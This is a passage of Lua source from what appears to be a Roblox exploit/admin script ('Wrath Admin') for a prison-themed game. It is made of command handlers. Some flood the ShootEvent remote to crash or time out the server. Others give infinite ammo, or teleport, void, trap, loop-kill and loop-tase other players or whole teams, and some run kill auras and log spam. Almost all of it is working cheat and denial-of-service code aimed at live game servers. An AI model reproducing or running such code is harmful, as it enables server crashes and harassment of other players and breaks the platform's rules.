                        local Gun = LocalPlayer.Backpack:FindFirstChild("M4A1") or LocalPlayer.Character:FindFirstChild("M4A1");
                        if Gun then
                            rStorage.ShootEvent:FireServer(Events, Gun);
                        end
                    end)
                end;
            end;
        end);
end
    spawn(m4a1crashmethod)
    if LocalPlayer.TeamColor == BrickColor.new("Bright blue") then
    Notify("Success", "Attempting to crash server with all 5 guns.", 2);
    else
    Notify("Success", "Attempting to crash server with all 4 guns.", 2);
    end
    else
    if LocalPlayer.TeamColor == BrickColor.new("Bright blue") then
    Notify("Success", "Attempting to crash server with all 4 guns.", 2);
    else
    Notify("Success", "Attempting to crash server with all 3 guns.", 2);
    end
    end
    end;
    if CMD("timeout") or CMD("spike") then
        -- This method actually makes sure the server crashes but it takes alot of time
        local hasAK47r = LocalPlayer.Backpack:FindFirstChild("AK-47") or LocalPlayer.Character:FindFirstChild("AK-47")
        if not hasAK47r then
        task.spawn(function()
        Workspace.Remote.ItemHandler:InvokeServer({Position = LocalPlayer.Character.Head.Position, Parent = workspace.Prison_ITEMS.giver:FindFirstChild("AK-47") or workspace.Prison_ITEMS.single:FindFirstChild("AK-47")})
        end)
        end
        local Events = {}
        task.wait(1/10);
        for i = 1, 100 do
            local origin, destination = LocalPlayer.Character.HumanoidRootPart.Position, workspace:FindFirstChildOfClass("Part").Position;
            local distance, ray = (origin-destination).Magnitude, Ray.new(origin, (destination-origin).unit*9e9)
            local cf = CFrame.new(destination, origin) * CFrame.new(0, 0, -distance / 2);
            Events[#Events+1] = {
                Hit = v,
                Cframe = cf,
                Distance = distance,
                RayObject = ray
            }
        end;
        task.spawn(function()
            while task.wait(0.03) do
                if LocalPlayer.Character then
                    task.spawn(function()
                        ItemHandler(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP);
                    end);
                    pcall(function()
                        local Gun = LocalPlayer.Backpack:FindFirstChild("AK-47") or LocalPlayer.Character:FindFirstChild("AK-47");
                        if Gun then
                            rStorage.ShootEvent:FireServer(Events, Gun);
                        end
                    end)
                end;
            end;
        end);
        Notify("Success", "Timed out.", 2);
    end;
    if CMD("carspawn") or CMD("spawncar") or CMD("scar") or CMD("cars") or CMD("car") then
        spawncars()
        Notify("Success", "Spawned a car to your location.", 2);
    end;
    if CMD("loopcars") or CMD("rcars") or CMD("looprandomcars") then
        if not myarguments.loopingcars then
        myarguments.loopingcars = true
        Notify("Success", "Now loop-spawning cars to random locations.", 2);
        while myarguments.loopingcars do
        pcall(function()
        randomcars()
        end)
        wait(1.1)
        end
        else
        Notify("Error", "Already loop-spawning cars to random locations.", 2);
        end
    end;
    if CMD("unlooprandomcars") or CMD("unlooprcars") or CMD("unlrcars") or CMD("unloopcars") then
        myarguments.loopingcars = false
        myarguments.loopingcarsto = false
        Notify("Success", "Stopped loop-spawning cars to random locations.", 2);
    end;
    if CMD("loopcarsto") or CMD("lcarsto") then
        if not myarguments.loopingcarsto then
        myarguments.loopingcarsto = true
        local Player = GetPlayer(Args[2], LocalPlayer)
        if Player then
        Notify("Success", "Loop-spawning cars to " .. Player.Name .. ". ");
        while myarguments.loopingcarsto do
        pcall(function()
        spawncarsto(Player)
        end)
        wait(1.1)
        end
        else
        Notify("Error", Args[2] .. " is not a valid player.", 2);
        end
        else
        Notify("Error", "Already loop-spawning cars to another player.", 2);
        end
    end;
    if CMD("unloopcarsto") or CMD("unlct") or CMD("unlcto") then
        Notify("Success", "Stopped spawning cars to player.", 2);
        myarguments.loopingcarsto = false
        myarguments.loopingcars = false
    end;
    if CMD("carsto") or CMD("spawncarsto") or CMD("scarto") then
        local Player = GetPlayer(Args[2], LocalPlayer)
        if Player then
            pcall(function()
            spawncarsto(Player)
            end)
            Notify("Success", "Spawned a car to " .. Player.Name .. "'s Location.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end; 
    if CMD("policecarspawn") or CMD("policecar") or CMD("pcars") or CMD("pcar") then
       spawnpolicecars()
       Notify("Success", "Spawned a police car to your location.", 2);
    end;
    if CMD("carbring") or CMD("bringcar") or CMD("bcar") or CMD("carb") then
        bringcars()
        Notify("Success", "Brought a car to your location.", 2);
    end;
    if CMD("ia") or CMD("infammo") then
        local Tool = LocalPlayer.Character:FindFirstChildWhichIsA("Tool")
        if Tool then
            if Tool:FindFirstChild("GunStates") then
                Notify("Success", "Enabled infinite ammo.", 2);
                local Stats = require(Tool.GunStates);
                Stats.MaxAmmo = math.huge;
                Stats.CurrentAmmo = math.huge;
                Stats.AmmoPerClip = math.huge;
                Stats.StoredAmmo = math.huge;
                AmmoGuns[#AmmoGuns+1] = Tool;
                task.wait(.1)
                LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
            else
                Notify("Error", "You aren't holding a gun.", 2);
            end;
        else
            Notify("Success", "You must equip a tool.", 2);
        end;
    end;
    if CMD("aia") or CMD("autoinfammo") then
        States.AutoInfiniteAmmo = not States.AutoInfiniteAmmo;
        Notify("Success", "Toggled auto inf ammo to " .. tostring(States.AutoInfiniteAmmo) .. ".", 2);
    end;
    if CMD("aaf") or CMD("autoaf") then
        States.AutoAutoFire = not States.AutoAutoFire;
        Notify("Success", "Toggled auto auto-fire to " .. tostring(States.AutoAutoFire) .. ".", 2);
    end;
    if CMD("tp") then
        local Player, Player2 = GetPlayer(Args[2], LocalPlayer), GetPlayer(Args[3], LocalPlayer);
        if Player and Player2 then
            if Player ~= Player2 then
                if Player2.Character then
                    local Head = Player2.Character:FindFirstChild("Head")
                    if Head then
                        SavePos()
                        TeleportPlayers(Player, Player2);
                        Notify("Success", "Teleported " .. Player.Name .. " to " .. Player2.Name .. ".");
                        task.wait(2)
                        game:GetService("VirtualInputManager"):SendKeyEvent(true, "Space", false, game)
                        task.wait(.1)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false, "Space", false, game)
                        LoadPos()
                    end;
                end;
            else
                Notify("Error", "You cannot do two of the same players.", 2);
            end;
        else
            Notify("Error", "Not valid player(s).", 2);
        end;
    end;
    if CMD("clwp") or CMD("clearwaypoints") then
        SavedWaypoints = {};
        pcall(function()
            delfile("WrathAdminSavedWayPoints.json");
        end);
        Notify("Success", "Cleared waypoints", 2);
    end;
    if CMD("wp") or CMD("setwaypoint") then
        pcall(function()
            if Args[2] then
                SaveWayPoint(LocalPlayer.Character.Head.Position, Args[2]);
                Notify("Success", "Created waypoint: " .. Args[2], 2);
            end;
        end);
    end;
    if CMD("tw") or CMD("towaypoint") then
        local Saved = SavedWaypoints[Args[2]]
        if Saved then
            Teleport(LocalPlayer, CFrame.new(Saved.X, Saved.Y, Saved.Z));
            Notify("Success", "Teleported to waypoint: " .. Args[2], 2);
        else
            Notify("Error", "That is not a valid waypoint.", 2);
        end;
    end;
    if CMD("dwp") or CMD("deletewaypoint") then
        local Saved = SavedWaypoints[Args[2]]
        if Saved then
            SavedWaypoints[Args[2]] = nil;
            pcall(function()
                writefile("WrathAdminSavedWayPoints.json", HttpService:JSONEncode(SavedWaypoints));
            end);
            Notify("Success", "Deleted waypoint: " .. Args[2], 2);
        else
            Notify("Error", "That is not a valid waypoint.", 2);
        end;
    end;
    if CMD("givecmds") or CMD("gcmds") then
        if Args[2] == "all" then
            for i,v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer then
                    Admins[v.UserId] = v;
                end;
            end;
            Chat("!!! EVERYONE HAS COMMANDS - say .cmds for a list of commands. !!!");
        else
            local Player = GetPlayer(Args[2], LocalPlayer)
            if Player then
                Admins[Player.UserId] = Player;
                Chat("/w " .. Player.Name .. " You have commands - say " .. Settings.Prefix .. "cmds to get a list of commands.")
                Notify("Success", "Gave " .. Player.Name .. " commands.", 2);
            else
                Notify("Error", Args[2] .. " isn't a valid player.", 2);
            end;
        end;
    end;
    if CMD("revokecmds") or CMD("uncmds") or CMD("rcmds") or CMD("revcmds") then
        if Args[2] == "all" then
            Admins = {}
            Chat("!!! Everyone's command has been revoked. !!!");
            Notify("Success", "Removed everyone's commands.", 2);
        else
            local Player = GetPlayer(Args[2], LocalPlayer)
            if Player then
                Admins[Player.UserId] = nil;
                Chat("/w " .. Player.Name .. " You have been revoked from using commands.");
                Notify("Success", "Removed " .. Player.Name .. "'s commands.", 2);
            else
                Notify("Error", Args[2] .. " isn't a valid player.", 2);
            end;
        end;
    end;
    if CMD("cla") or CMD("clearadmins") then
        Admins = {};
        Notify("Success", "Cleared admins.", 2);
    end;
    if CMD("void") then
        local Player = GetPlayer(Args[2], LocalPlayer)
        if Player then
            mysaved.voidcmdoldpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
            Teleport(Player, CFrame.new(0, 9e9, 0));
            diedpos = mysaved.voidcmdoldpos
            wait(1)
            Jump()
            Refresh()
            chwait()
            diedpos = mysaved.voidcmdoldpos
            LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysaved.voidcmdoldpos
            Notify("Success", "Teleported " .. Player.Name .. " to the void.", 2);
        else
            Notify("Error", Args[2] .. " isn't a valid player.", 2);
        end;
    end;
    if CMD("loopvoid") or CMD("lvoid") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Loopvoided[Player.UserId] = Player;
            Notify("Success", "Loop-voiding " .. Player.Name .. ". ", 2);
        else
            Notify("Error", Args[2] .. " isn't a valid player.", 2);
        end;
    end;
    if CMD("unloopvoid") or CMD("unlvoid") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Args[2] == "all" then
            Loopvoided = {};
            Notify("Success", "Unloop-voided all.", 2);
        elseif Player then
            Loopvoided[Player.UserId] = nil;
            Notify("Success", "Unloop-voided " .. Player.Name .. ".", 2);
        else
            Notify("Error", Args[2] .. " isn't a valid player.", 2);
        end;
    end;
    if CMD("clvd") or CMD("clearvoided") or CMD("clearloopvoid") then
        Loopvoided = {};
        Notify("Success", "Cleared loop-voided players.", 2);
    end;
    if CMD("trap") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Trapped[Player.UserId] = Player;
            Notify("Success", "Trapped " .. Player.Name .. ". Type " .. Settings.Prefix .. "untrap [plr] to free them.", 2);
        else
            Notify("Error", Args[2] .. " isn't a valid player.", 2);
        end;
    end;
    if CMD("untrap") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Trapped[Player.UserId] = nil;
            Teleport(Player, CFrame.new(888, 100, 2388))
            Notify("Success", "Untrapped " .. Player.Name .. ".", 2);
        else
            Notify("Error", Args[2] .. " isn't a valid player.", 2);
        end;
    end;
    if CMD("cleartrapped") or CMD("cltr") then
        Trapped = {};
        Notify("Success", "Cleared all trapped", 2);
    end;
    if CMD("getinv") or CMD("getinvis") then
        pprint("====== INVISIBLE PLAYERS ======")
        for _,CHAR in pairs(workspace:GetChildren()) do
            if Players:FindFirstChild(CHAR.Name) then
                local Head = CHAR:FindFirstChild("Head")
                if Head then
                    if Head.Position.Y > 5000 or Head.Position.X > 99999 then
                        pprint(CHAR.Name .. " (" .. Players:FindFirstChild(CHAR.Name).DisplayName .. ")");
                    end
                end
            end
        end
        pprint("====== END ======")
        Notify("Success", "Type /console or F9 to see invisible players.", 2);
    end;
    if CMD("getf") or CMD("getflings") then
        pprint("====== INVISIBLE FLINGERS ======")
        local ValidParts = {}
        for _,CHAR in pairs(workspace:GetChildren()) do
            if Players:FindFirstChild(CHAR.Name) then
                for _,object in pairs(CHAR:GetChildren()) do
                    ValidParts[object.Name] = object;
                end
                if not ValidParts["Torso"] and not ValidParts["Head"] then
                    pprint(CHAR.Name .. " (" .. Players:FindFirstChild(CHAR.Name).DisplayName .. ")");
                end
                ValidParts = {}
            end
        end
        pprint("====== END ======")
        Notify("Success", "Type /console or F9 to see invisible flingers.", 2);
    end
    if CMD("geta") or CMD("getarmorspammers") then
        pprint("====== ARMOR SPAMMERS ======")
        for i,v in pairs(ArmorSpamFlags) do
            if v > 50 and Players:FindFirstChild(i) then
                pprint(i .. " (" .. Players:FindFirstChild(i).DisplayName .. ")");
            end;
        end;
        pprint("====== END ======")
        Notify("Success", "Type /console or F9 to see armor spammers.", 2);
    end;
    if CMD("getlk") or CMD("getloopkills") then
        pprint("====== LOOPKILLING ======")
        if States.KillAll then
        pprint("Loopkill_All: true")
        else
        pprint("Loopkill_All: false")
        end
        if States.KillInmates then
        pprint("Loopkill_Inmates: true")
        else
        pprint("Loopkill_Inmates: false")
        end
        if States.KillGuards then
        pprint("Loopkill_Guards: true")
        else
        pprint("Loopkill_Guards: false")
        end
        if States.KillCriminals then
        pprint("Loopkill_Criminals: true")
        else
        pprint("Loopkill_Criminals: false")
        end
        for i,v in pairs(Loopkilling) do
            pprint(v.Name .. " (" .. v.DisplayName .. ")");
        end;
        pprint("====== END ======")
        Notify("Success", "Type /console or F9 to see who are being loopkilled.", 2);
    end;
    if CMD("getp") or CMD("getprotected") then
        pprint("====== PROTECTED ======")
        for i,v in pairs(Protected) do
            pprint(v.Name .. " (" .. v.DisplayName .. ")");
        end;
        pprint("====== END ======")
        Notify("Success", "Type /console or F9 to see protected.", 2);
    end;
    if CMD("bfling") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            if not States.BodyFling then
                coroutine.wrap(BodyFling)(Player);
                Notify("Success", "Body flung " .. Player.Name .. ".", 2);
            else
                Notify("Error", "You are already body flinging someone.", 2);
            end
        else
            Notify("Error", Args[2] .. " isn't a valid player.", 2);
        end;
    end;
    if CMD("psettings") or CMD("ps") then
        local Setting, Value = Args[2], ToBoolean(Args[3]);
        if Setting and Value ~= nil then
            ProtectedSettings[Setting] = Value;
            Notify("Success", "Set " .. Args[2] .. " to: " .. Args[3] .. ". (Protected Settings)", 2);
        end;
        ChangeImmunityToggle(ProtectedSettings.killcmds, "Kill Commands");
        ChangeImmunityToggle(ProtectedSettings.tpcmds, "Teleport Commands");
        ChangeImmunityToggle(ProtectedSettings.arrestcmds, "Arrest Commands");
        ChangeImmunityToggle(ProtectedSettings.othercmds, "Other Commands");
    end;
    if CMD("unbfling") then
        States.BodyFling = false;
        Notify("Success", "Stopped body fling.", 2);
    end;
    if CMD("getadmins") then
        pprint("====== ADMINS ======")
        for i,v in next, Admins do
            pprint(v.Name .. " (" .. v.DisplayName .. ")");
        end;
        Notify("Success", "Type /console or F9 to see admins.", 2);
        pprint("====== END ======")
    end;
    if CMD("getwpnames") or CMD("getwaypointnames") then
        pprint("====== WAYPOINTS ======")
        for i,v in next, SavedWaypoints do
            pprint(i .. ":", v.X, v.Y, v.Z);
        end;
        Notify("Success", "Type /console or F9 to see waypoints.", 2);
        pprint("====== END ======")
    end
    if CMD("as") or CMD("asettings") then
        local Setting, Value = Args[2], ToBoolean(Args[3]);
        if Setting and Value ~= nil then
            AdminSettings[Setting] = Value;
            Notify("Success", "Set " .. Args[2] .. " to: " .. Args[3] .. ". (Admin Settings)", 2);
        end;
        ChangeAdminGuiToggle(AdminSettings.killcmds, "Kill Commands");
        ChangeAdminGuiToggle(AdminSettings.tpcmds, "Teleport Commands");
        ChangeAdminGuiToggle(AdminSettings.arrestcmds, "Arrest Commands");
        ChangeAdminGuiToggle(AdminSettings.othercmds, "Other Commands");
    end;
    if CMD("antipunch") or CMD("ap") then
        States.AntiPunch = not States.AntiPunch;
        ChangeGuiToggle(States.AntiPunch, "Anti-Punch");
        Notify("Success", "Toggled anti-punch to " .. tostring(States.AntiPunch) .. ".", 2);
    end;
    if CMD("exit") or CMD("fuckoff") then
        Notify("Success", "Unloading....", 2);
        States = {};
        UnloadScript();
        getgenv().WrathLoaded = false;
    end
    if CMD("ls") or CMD("logspam") then
        for i,v in next, Args do
            if i > 2 then
                Args[2] = Args[2] .. " " .. Args[i];
            end;
        end;
        local Message = Args[2];
        Notify("Success", "Now log spamming.", 2);
        coroutine.wrap(LogSpam)(Message);
    end;
    if CMD("unls") or CMD("unlogspam") then
        Notify("Success", "Stopped spamming.", 2);
        States.LogSpam = false;
    end;
    if CMD("prefix") then
        local Prefix = Args[2]
        if Prefix then
            Settings.Prefix = Prefix;
            Notify("Success", "Prefix was changed to: " .. Prefix, 2);
        end;
    end;
    if CMD("mkill") or CMD("meleekill") or CMD("mk") then
        SavePos();
        if Args[2] == "all" then
            for i,v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    MeleeKill(v)
                end;
            end;
            Notify("Success", "Melee killed everyone.", 2);
        elseif Args[2] == "inmates" or Args[2] == "inmate" or Args[2] == "i" then
            for i,v in pairs(Teams.Inmates:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    MeleeKill(v)
                end
            end
            Notify("Success", "Melee killed inmates.", 2);
        elseif Args[2] == "guards" or Args[2] == "guard" or Args[2] == "g" then
            for i,v in pairs(Teams.Guards:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    MeleeKill(v)
                end
            end
            Notify("Success", "Melee killed guards.", 2);
        elseif Args[2] == "criminals" or Args[2] == "criminal" or Args[2] == "c" then
            for i,v in pairs(Teams.Criminals:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    MeleeKill(v)
                end
            end
            Notify("Success", "Melee killed criminals.", 2);
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                MeleeKill(Player);
                Notify("Success", "Melee killed " .. Player.Name .. ".", 2);
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
        LoadPos();
    end;
    if CMD("tkill") or CMD("telekill") or CMD("teleportkill") or CMD("tk") then
        SavePos();
        if Args[2] == "all" then
            for i,v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    TeleportKill(v)
                end;
            end;
            Notify("Success", "Teleport killed everyone.", 2);
        elseif Args[2] == "inmates" or Args[2] == "inmate" or Args[2] == "i" then
            for i,v in pairs(Teams.Inmates:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    TeleportKill(v)
                end
            end
        elseif Args[2] == "guards" or Args[2] == "guard" or Args[2] == "g" then
            for i,v in pairs(Teams.Guards:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    TeleportKill(v)
                end
            end
        elseif Args[2] == "criminals" or Args[2] == "criminal" or Args[2] == "c" then
            for i,v in pairs(Teams.Criminals:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    TeleportKill(v)
                end
            end
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                TeleportKill(Player);
                Notify("Success", "Teleport killed " .. Player.Name .. ".", 2);
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
        LoadPos();
    end;
    if CMD("vkill") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            VoidKill(Player);
            Notify("Success", "Void killed " .. Player.Name .. ".", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("getps") or CMD("getprotectedsettings") then
        pprint("====== PROTECTED SETTINGS ======")
        for i,v in pairs(ProtectedSettings) do
            pprint(i, v);
        end;
        pprint("====== END ======");
        Notify("Success", "Type /console or F9 to see protected settings.", 2);
    end;
    if CMD("getas") or CMD("getadminsettings") then
        pprint("====== ADMIN SETTINGS ======");
        for i,v in pairs(AdminSettings) do
            pprint(i, v);
        end;
        pprint("====== END ======");
        Notify("Success", "Type /console or F9 to see admin settings.", 2);
    end;
    if CMD("getv") or CMD("getinfected") then
        pprint("====== INFECTED PLAYERS ======");
        for i,v in pairs(Infected) do
            pprint(v.Name .. " (" .. v.DisplayName .. ")");
        end;
        pprint("====== END ======");
        Notify("Success", "Type /console or F9 to see infected players.", 2);
    end;
    if CMD("getk") or CMD("getkillaura") then
        pprint("====== KILL AURAS ======")
        for i,v in pairs(KillAuras) do
            pprint(v.Name .. " (" .. v.DisplayName .. ")");
        end;
        pprint("====== END ======");
        Notify("Success", "Type /console or F9 to see kill auras.", 2);
    end;
    if CMD("clka") or CMD("clearkillaura") then
        KillAuras = {}
        Notify("Success", "Cleared kill auras", 2);
    end;
    if CMD("fpsboost") or CMD("antilag") or CMD("boost") then
        Notify("Loading...", "FPS boost", 2);
        FPSBoost();
    end;
    if CMD("tase") or CMD("taze") then
        SavedOldTeam = game.Players.LocalPlayer.TeamColor
        if Args[2] == "all" then
            Tase(Players:GetPlayers());
            Notify("Success", "Tased everyone.", 2);
            task.wait(0.5)
	if SavedOldTeam ~= BrickColor.new("Bright blue") then
                if SavedOldTeam ~= BrickColor.new("Really red") then
                    SaveCameraPos()
                    diedpos = char:WaitForChild("HumanoidRootPart").CFrame
		    workspace.Remote.TeamEvent:FireServer(SavedOldTeam.Name)
                    LoadCameraPos()
                else
                      diedpos = char:WaitForChild("HumanoidRootPart").CFrame
                                 repeat
                                 SaveCameraPos()
                                 task.wait()
	                         crimspawnpoint = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                                 workspace["Criminals Spawn"].SpawnLocation.CFrame = crimspawnpoint
                                 until player.TeamColor == BrickColor.new("Really red")
                                 LoadCameraPos()
                                 local object = workspace['Criminals Spawn'].SpawnLocation
                                 local newPosition = CFrame.new(Vector3.new(10, 100, 10))
                                 object.CFrame = newPosition
                end
	end
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                Tase({Player});
                Notify("Success", "Tased " .. Player.Name .. ".", 2);
	if SavedOldTeam ~= BrickColor.new("Bright blue") then
                if SavedOldTeam ~= BrickColor.new("Really red") then
                    SaveCameraPos()
                    diedpos = char:WaitForChild("HumanoidRootPart").CFrame
		    workspace.Remote.TeamEvent:FireServer(SavedOldTeam.Name)
                    LoadCameraPos()
                else 
                      diedpos = char:WaitForChild("HumanoidRootPart").CFrame
                                 repeat
                                 SaveCameraPos()
                                 task.wait()
	                         crimspawnpoint = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                                 workspace["Criminals Spawn"].SpawnLocation.CFrame = crimspawnpoint
                                 until player.TeamColor == BrickColor.new("Really red")
                                 LoadCameraPos()
                                 local object = workspace['Criminals Spawn'].SpawnLocation
                                 local newPosition = CFrame.new(Vector3.new(10, 100, 10))
                                 object.CFrame = newPosition
                end
	end
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end
    end;
    if CMD("ta") or CMD("taseaura") then
        if Args[2] == "all" then
            for i,v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    TaseAuras[v.UserId] = v;
                end;
            end;
            Notify("Success", "Gave everyone tase aura.", 2);
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                TaseAuras[Player.UserId] = Player;
                Notify("Success", "Gave " .. Player.Name .. " tase aura.", 2);
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("unta") or CMD("untaseaura") then
        if Args[2] == "all" then
            TaseAuras = {}
            Notify("Success", "Removed everyone's tase aura.", 2);
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                TaseAuras[Player.UserId] = nil;
                Notify("Success", "Removed " .. Player.Name .. "'s tase aura.", 2);
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("lt") or CMD("looptase") or CMD("looptaze") then
        SavedOldTeam = game.Players.LocalPlayer.TeamColor
        if Args[2] == "all" then
            States.TaseAll = true;
            Notify("Success", "Loop-tasing everyone.", 2);
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                LoopTasing[Player.UserId] = Player;
                Notify("Success", "Loop-tasing " .. Player.Name .. ".", 2);
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("unlt") or CMD("unlooptase") or CMD("unlooptaze") then
  	if SavedOldTeam ~= BrickColor.new("Bright blue") then
                if SavedOldTeam ~= BrickColor.new("Really red") then
                    diedpos = char:WaitForChild("HumanoidRootPart").CFrame
		    workspace.Remote.TeamEvent:FireServer(SavedOldTeam.Name)
                end
	end
        if Args[2] == "all" then
            States.TaseAll = false
            LoopTasing = {};
            Notify("Success", "Stopped loop-tasing everyone.", 2);
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                LoopTasing[Player.UserId] = nil;
                Notify("Success", "Stopped Loop-tasing " .. Player.Name .. ".", 2);
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("clt") or CMD("cleartase") then
        LoopTasing = {};
        Notify("Success", "Cleared loop tase.", 2);
    end;
    if CMD("ma") or CMD("meleeaura") then
        if States.tkaInmates or States.tkaGuards or States.tkaCriminals then
        Notify("Error", "Turn off team killaura first!", 2);
        else
        States.MeleeAura = not States.MeleeAura
        Notify("Success", "Toggled melee aura to " .. tostring(States.MeleeAura) .. ".", 2);
        if States.MeleeAura and not States.tkaInmates and not States.tkaGuards and not States.tkaCriminals then -- Moved it here because to reduce the amount of while true do loops constantly running even when not used, and probably boost fps
    while States.MeleeAura do task.wait()
      pcall(function()
        if States.MeleeAura then
            for i,v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    if LocalPlayer.Character and v.Character and v.Character:FindFirstChild("Humanoid").Health ~= 0 and not v.Character:FindFirstChild("ForceField") then
                        local LHead, VHead = LocalPlayer.Character:FindFirstChildWhichIsA("BasePart"), v.Character:FindFirstChildWhichIsA("BasePart")
                        if LHead and VHead then
                            if (LHead.Position-VHead.Position).Magnitude <= 50 then
                                for i = 1, 5 do
                                    MeleeEvent(v);
                                end;
                            end;
                        end;
                    end;
                end;
            end;
        end;
      end)
    end;
        end
      end
    end;
    if CMD("teamkillaura") or CMD("tkillaura") or CMD("tka") then
        States.MeleeAura = false
        if Args[2] == "inmates" or Args[2] == "inmate" or Args[2] == "i" then
          if not States.tkaInmates then
            States.tkaInmates = true;
            Notify("Success", "Enabled team killaura for: Inmates.", 2);
    while States.tkaInmates do task.wait()
      pcall(function()
        if States.tkaInmates then
            for i,v in pairs(Teams.Inmates:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    if LocalPlayer.Character and v.Character and v.Character:FindFirstChild("Humanoid").Health ~= 0 and not v.Character:FindFirstChild("ForceField") then
                        local LHead, VHead = LocalPlayer.Character:FindFirstChildWhichIsA("BasePart"), v.Character:FindFirstChildWhichIsA("BasePart")
                        if LHead and VHead then
                            if (LHead.Position-VHead.Position).Magnitude <= 50 then
                                for i = 1, 5 do
                                    MeleeEvent(v);
                                end;
                            end;
                        end;
                    end;
                end;
            end;
        end;
      end)
    end;
        else
            Notify("Error", "Already enabled team killaura for: Inmates.", 2);
        end
        elseif Args[2] == "guards" or Args[2] == "guard" or Args[2] == "g" then
            if not States.tkaGuards then
            States.tkaGuards = true
            Notify("Success", "Enabled team killaura for: Guards.", 2);
    while States.tkaGuards do task.wait()
      pcall(function()
        if States.tkaGuards then
            for i,v in pairs(Teams.Guards:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    if LocalPlayer.Character and v.Character and v.Character:FindFirstChild("Humanoid").Health ~= 0 and not v.Character:FindFirstChild("ForceField") then
                        local LHead, VHead = LocalPlayer.Character:FindFirstChildWhichIsA("BasePart"), v.Character:FindFirstChildWhichIsA("BasePart")
                        if LHead and VHead then
                            if (LHead.Position-VHead.Position).Magnitude <= 50 then
                                for i = 1, 5 do
                                    MeleeEvent(v);
                                end;
                            end;
                        end;
                    end;
                end;
            end;
        end;
      end)
    end;
        else
            Notify("Error", "Already enabled team killaura for: Guards.", 2);
        end
        elseif Args[2] == "criminals" or Args[2] == "criminal" or Args[2] == "c" then
            if not States.tkaCriminals then
            States.tkaCriminals = true
            Notify("Success", "Enabled team killaura for: Criminals.", 2);
    while States.tkaCriminals do task.wait()
      pcall(function()
        if States.tkaCriminals then
            for i,v in pairs(Teams.Criminals:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    if LocalPlayer.Character and v.Character and v.Character:FindFirstChild("Humanoid").Health ~= 0 and not v.Character:FindFirstChild("ForceField") then
                        local LHead, VHead = LocalPlayer.Character:FindFirstChildWhichIsA("BasePart"), v.Character:FindFirstChildWhichIsA("BasePart")
                        if LHead and VHead then
                            if (LHead.Position-VHead.Position).Magnitude <= 50 then
                                for i = 1, 5 do
                                    MeleeEvent(v);
                                end;
                            end;
                        end;
                    end;
                end;
            end;
        end;
      end)
    end;
        else
        Notify("Error", "Already enabled team killaura for: Criminals.", 2);
        end
      else
        Notify("Error", "Not a valid team.", 2);
      end
      if States.tkaInmates and States.tkaGuards and States.tkaCriminals and not States.MeleeAura then
          States.tkaInmates = false
          States.tkaGuards = false
          States.tkaCriminals = false
          States.MeleeAura = true
          Notify("Error", "Enabled all team killaura, automatically switched to meleeaura instead.", 2);
    while States.MeleeAura do task.wait()
      pcall(function()
        if States.MeleeAura then
            for i,v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    if LocalPlayer.Character and v.Character and v.Character:FindFirstChild("Humanoid").Health ~= 0 and not v.Character:FindFirstChild("ForceField") then
                        local LHead, VHead = LocalPlayer.Character:FindFirstChildWhichIsA("BasePart"), v.Character:FindFirstChildWhichIsA("BasePart")
                        if LHead and VHead then
                            if (LHead.Position-VHead.Position).Magnitude <= 50 then
                                for i = 1, 5 do
                                    MeleeEvent(v);
                                end;
                            end;
                        end;
                    end;
                end;
            end;
        end;
      end)
    end;
      end
    end;
    if CMD("untka") or CMD("untkillaura") or CMD("unteamkillaura") then
        if Args[2] == "all" then
            States.tkaInmates = false
            States.tkaGuards = false
            States.tkaCriminals = false
